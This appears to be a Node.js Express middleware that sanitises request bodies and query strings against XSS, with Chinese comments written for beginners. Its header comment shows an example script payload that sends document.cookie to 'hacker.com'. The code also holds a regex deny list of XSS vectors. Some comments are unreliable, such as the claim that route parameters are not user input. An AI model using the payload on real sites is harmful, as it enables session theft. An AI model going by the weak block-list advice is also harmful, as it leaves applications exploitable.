/**
 * 晨光自律台 · XSS 防护中间件 — 输入净化
 * ============================================================
 * 【给初学者的说明】
 *
 * 一、什么是 XSS 攻击（Cross-Site Scripting，跨站脚本攻击）？
 *    假设一个论坛允许用户发帖，服务器把内容原样显示给所有访客。
 *    攻击者发了一条帖子：
 *      <script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>
 *    服务器把这段"帖子内容"存进数据库。
 *    当其他用户浏览这条帖子时，浏览器会执行这段 <script>，
 *    把受害者的 Cookie 发送给攻击者！攻击者就能冒充受害者。
 *
 *    这就是"存储型 XSS"——恶意脚本被存入数据库，影响所有访客。
 *
 * 二、怎么防御 XSS？
 *    关键：对用户输入进行"HTML 实体编码"。
 *
 *    编码规则：
 *    - <  变成  &lt;    （浏览器会显示 <，但不会当成标签执行）
 *    - >  变成  &gt;
 *    - &  变成  &amp;
 *    - "  变成  &quot;
 *    - '  变成  &#x27;
 *
 *    编码后，用户输入的 <script> 就变成了 &lt;script&gt;，
 *    浏览器只是把它当成普通文本显示，不会执行。
 *
 * 三、额外清理
 *    除了 HTML 编码，我们还额外移除：
 *    - javascript: / vbscript: 协议（防止 <a href="javascript:..."> 攻击）
 *    - on* 事件处理器（防止 <img onerror="..."> 攻击）
 *    - <script> / <iframe> 等危险标签
 *
 * 四、哪些字段不需要编码？
 *    密码、邮箱、Token 等字段——它们是用于认证的原始数据，
 *    HTML 编码会破坏它们的值，导致登录失败。
 *    但仍然需要移除危险内容（script 标签等）。
 * ============================================================
 */

// 危险模式正则：匹配各种 XSS 攻击向量
const DANGEROUS_PATTERNS = [
  /javascript:/gi,           // javascript: 协议（如 <a href="javascript:alert(1)">）
  /vbscript:/gi,              // vbscript: 协议（IE 浏览器特有）
  /on\w+\s*=/gi,              // onXxx= 事件处理器（如 onerror=、onclick=、onload=）
  /<script[^>]*>/gi,          // <script> 开始标签（可带属性，如 <script src="...">）
  /<\/script>/gi,             // </script> 结束标签
  /<iframe[^>]*>/gi,          // <iframe> 标签（可嵌入恶意页面）
  /<object[^>]*>/gi,          // <object> 标签（可加载 Flash 等插件）
  /<embed[^>]*>/gi,           // <embed> 标签（可嵌入多媒体内容）
];

// 不做 HTML 编码的字段（需要原始字符，如密码/邮箱）
// 这些字段用于认证，HTML 编码会破坏它们的值
const SKIP_ENCODE_FIELDS = new Set([
  'password',         // 密码
  'password_hash',    // 密码哈希值
  'email',            // 邮箱地址
  'token',            // 认证令牌
  'oldPassword',      // 旧密码（修改密码用）
  'newPassword',      // 新密码
  'confirmPassword',  // 确认密码
]);

/**
 * HTML 实体编码函数
 *
 * 把用户输入中的特殊字符转换成"HTML 实体"，
 * 这样浏览器就不会把它们当成 HTML 标签执行。
 *
 * 例如：输入 "<script>alert(1)</script>"
 *      编码后： "&lt;script&gt;alert(1)&lt;/script&gt;"
 *      浏览器只会显示文本，不会执行脚本
 */
function escapeHtml(str) {
  if (typeof str !== 'string') return str;
  return str
    .replace(/&/g, '&amp;')   // & → &amp;（必须最先处理，否则会重复编码）
    .replace(/</g, '&lt;')    // < → &lt;
    .replace(/>/g, '&gt;')    // > → &gt;
    .replace(/"/g, '&quot;')  // " → &quot;
    .replace(/'/g, '&#x27;'); // ' → &#x27;
}

/**
 * 移除危险内容（script 标签/事件处理器/脚本协议）
 *
 * 这是第一道防线：先把明显的攻击代码删掉。
 * 然后 escapeHtml 是第二道防线：把剩余的特殊字符编码。
 */
function stripDangerous(str) {
  if (typeof str !== 'string') return str;
  let cleaned = str;
  for (const pattern of DANGEROUS_PATTERNS) {
    cleaned = cleaned.replace(pattern, '');
  }
  return cleaned;
}

/**
 * 净化单个值（递归处理）
 *
 * 这个函数能处理各种数据类型：
 * - 字符串：先移除危险内容，再 HTML 实体编码
 * - 数组：递归处理每个元素
 * - 对象：递归处理每个属性
 * - 其他类型（数字、布尔等）：原样返回
 *
 * @param {*} value 要净化的值
 * @param {string} [key] 当前字段名（用于判断是否跳过编码）
 */
function sanitizeValue(value, key) {
  if (typeof value === 'string') {
    // 密码/邮箱等字段只移除危险内容，不做 HTML 编码（避免破坏认证）
    if (key && SKIP_ENCODE_FIELDS.has(key)) {
      return stripDangerous(value);
    }
    // 普通字符串：先移除危险内容，再 HTML 实体编码
    return escapeHtml(stripDangerous(value));
  }
  // 数组：递归处理每个元素
  if (Array.isArray(value)) {
    return value.map((item) => sanitizeValue(item, key));
  }
  // 对象：递归处理每个属性
  if (value !== null && typeof value === 'object') {
    const result = {};
    for (const k of Object.keys(value)) {
      result[k] = sanitizeValue(value[k], k);
    }
    return result;
  }
  // 数字、布尔等其他类型：原样返回
  return value;
}

/**
 * XSS 净化中间件
 *
 * 工作流程：
 * 1. 检查 req.body（POST/PUT 请求体）中的所有字符串
 * 2. 检查 req.query（URL 查询参数）中的所有字符串
 * 3. 对每个字符串进行净化（移除危险内容 + HTML 编码）
 * 4. 调用 next() 继续处理
 *
 * 注意：不处理 req.params（路由参数）
 * 因为路由参数由 Express 路由器控制，不是用户直接输入的，
 * 而且 HTML 编码会破坏 UUID 等参数值
 */
function sanitizeInput(req, _res, next) {
  try {
    // 净化请求体
    if (req.body && typeof req.body === 'object') {
      req.body = sanitizeValue(req.body);
    }
    // 净化查询参数
    if (req.query && typeof req.query === 'object') {
      req.query = sanitizeValue(req.query);
    }
    // 不净化 req.params：路由参数由 Express 路由器控制，不是用户输入
    // 且 HTML 编码会破坏 UUID 等参数值
    next();
  } catch (err) {
    // 净化过程中出错，交给错误处理中间件
    next(err);
  }
}

module.exports = sanitizeInput;
module.exports.sanitizeValue = sanitizeValue;
module.exports.escapeHtml = escapeHtml;
module.exports.stripDangerous = stripDangerous;
